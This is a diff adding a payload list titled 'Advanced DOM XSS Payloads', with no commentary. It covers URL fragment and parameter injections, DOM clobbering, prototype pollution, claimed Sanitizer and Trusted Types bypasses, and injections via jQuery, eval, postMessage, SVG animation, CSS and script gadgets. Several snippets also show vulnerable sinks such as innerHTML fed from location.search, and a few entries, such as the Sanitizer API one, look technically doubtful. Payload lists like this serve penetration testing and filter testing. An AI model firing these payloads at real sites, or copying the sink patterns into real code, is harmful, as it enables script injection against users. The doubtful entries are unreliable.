@@ -1,0 +1,198 @@
+# Advanced DOM XSS Payloads - 2025 Edition
+
+# URL Fragment Based DOM XSS
+javascript:void(location.hash='<img src=x onerror=alert(1)>')
+javascript:void(location.hash='javascript:alert(1)')
+javascript:void(location.hash='<svg onload=alert(1)>')
+
+# URL Parameter Based DOM XSS
+?search=<img src=x onerror=alert(1)>
+?q=<svg onload=alert(1)>
+?redirect=javascript:alert(1)
+?returnUrl=javascript:alert(1)
+?next=javascript:alert(1)
+?url=javascript:alert(1)
+
+# DOM Clobbering Attacks
+<a id=defaultView name=alert href=1>click me</a>
+<a id=location name=href href=javascript:alert(1)>click me</a>
+<form id=self name=location><input name=href value=javascript:alert(1)></form>
+<object id=cookie name=__proto__><param name=value value=XSS></object>
+
+# Prototype Pollution DOM XSS
+<script>
+Object.prototype.src = 'x';
+Object.prototype.onerror = 'alert(1)';
+</script>
+<script>
+Object.prototype.srcdoc = '<script>alert(1)<\/script>';
+</script>
+<script>
+Object.prototype.vulnerable = 'javascript:alert(1)';
+</script>
+
+# Shadow DOM XSS
+<div id=shadow></div>
+<script>
+shadow.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>';
+</script>
+
+# Template Literal Injection
+<script>
+var input = '<img src=x onerror=alert(1)>';
+eval(`var template = \`${input}\`;`);
+document.body.innerHTML = template;
+</script>
+
+# DOM XSS via Sanitizer API Bypass
+<script>
+const sanitizer = new Sanitizer();
+const input = '<img src=x onerror=alert(1)>';
+document.body.setHTML(input, {sanitizer});
+</script>
+
+# DOM XSS via Trusted Types Bypass
+<script>
+if (window.trustedTypes) {
+  const policy = trustedTypes.createPolicy('bypass', {
+    createHTML: (s) => s
+  });
+  document.body.innerHTML = policy.createHTML('<img src=x onerror=alert(1)>');
+}
+</script>
+
+# DOM XSS via innerHTML
+<script>
+location.search.substring(1).split('&').forEach(param => {
+  const [name, value] = param.split('=');
+  if (name === 'q') {
+    document.getElementById('results').innerHTML = decodeURIComponent(value);
+  }
+});
+</script>
+
+# DOM XSS via jQuery
+<script>
+$(location.hash.slice(1)).appendTo('body');
+</script>
+<script>
+$('#element').html(location.search.split('q=')[1]);
+</script>
+
+# DOM XSS via document.write
+<script>
+document.write('<script>alert(1)<\/script>');
+</script>
+<script>
+document.write(location.search.substring(1));
+</script>
+
+# DOM XSS via eval
+<script>
+eval('document.body.innerHTML = "' + location.search.substring(1) + '"');
+</script>
+<script>
+setTimeout('document.body.innerHTML = "' + location.search.substring(1) + '"', 100);
+</script>
+
+# DOM XSS via Function constructor
+<script>
+new Function('document.body.innerHTML = "' + location.search.substring(1) + '"')();
+</script>
+
+# DOM XSS via postMessage
+<script>
+window.addEventListener('message', function(e) {
+  document.body.innerHTML = e.data;
+});
+</script>
+
+# DOM XSS via localStorage/sessionStorage
+<script>
+localStorage.setItem('data', '<img src=x onerror=alert(1)>');
+document.body.innerHTML = localStorage.getItem('data');
+</script>
+
+# DOM XSS via Web Workers
+<script>
+const workerCode = `
+  self.addEventListener('message', function(e) {
+    self.postMessage('<img src=x onerror=alert(1)>');
+  });
+`;
+const blob = new Blob([workerCode], {type: 'application/javascript'});
+const worker = new Worker(URL.createObjectURL(blob));
+worker.onmessage = function(e) {
+  document.body.innerHTML = e.data;
+};
+worker.postMessage('start');
+</script>
+
+# DOM XSS via Service Workers
+<script>
+navigator.serviceWorker.register('/sw.js').then(reg => {
+  navigator.serviceWorker.addEventListener('message', e => {
+    document.body.innerHTML = e.data;
+  });
+});
+</script>
+
+# DOM XSS via WebSockets
+<script>
+const ws = new WebSocket('wss://echo.websocket.org');
+ws.onopen = function() {
+  ws.send('<img src=x onerror=alert(1)>');
+};
+ws.onmessage = function(e) {
+  document.body.innerHTML = e.data;
+};
+</script>
+
+# DOM XSS via Fetch API
+<script>
+fetch('/api/data')
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('content').innerHTML = data.message;
+  });
+</script>
+
+# DOM XSS via MutationObserver
+<script>
+const observer = new MutationObserver(mutations => {
+  for (const mutation of mutations) {
+    if (mutation.type === 'attributes') {
+      document.body.innerHTML = mutation.target.getAttribute(mutation.attributeName);
+    }
+  }
+});
+observer.observe(document.body, { attributes: true });
+document.body.setAttribute('data-xss', '<img src=x onerror=alert(1)>');
+</script>
+
+# DOM XSS via Custom Elements
+<script>
+class XssElement extends HTMLElement {
+  connectedCallback() {
+    this.innerHTML = this.getAttribute('data-content');
+  }
+}
+customElements.define('xss-element', XssElement);
+</script>
+<xss-element data-content="<img src=x onerror=alert(1)>"></xss-element>
+
+# DOM XSS via SVG Animation
+<svg><animate attributeName=href values=javascript:alert(1) begin=0 /></svg>
+<svg><animate attributeName=href from=javascript:alert(1) to=1 begin=0 /></svg>
+<svg><set attributeName=href from=? to=javascript:alert(1) begin=0 /></svg>
+
+# DOM XSS via CSS
+<style>
+@import url('data:text/css,body:after { content: "</style><img src=x onerror=alert(1)>"; }');
+</style>
+<link rel=stylesheet href="data:text/css,body:after { content: '</style><img src=x onerror=alert(1)>'; }">
+
+# DOM XSS via Script gadgets
+<div data-bind="html: '<img src=x onerror=alert(1)>'"></div>
+<div ng-app ng-csp><div ng-include="'data:text/html,<script>alert(1)</script>'"></div></div>
+<div class="markdown-body" data-content="<img src=x onerror=alert(1)>"></div>
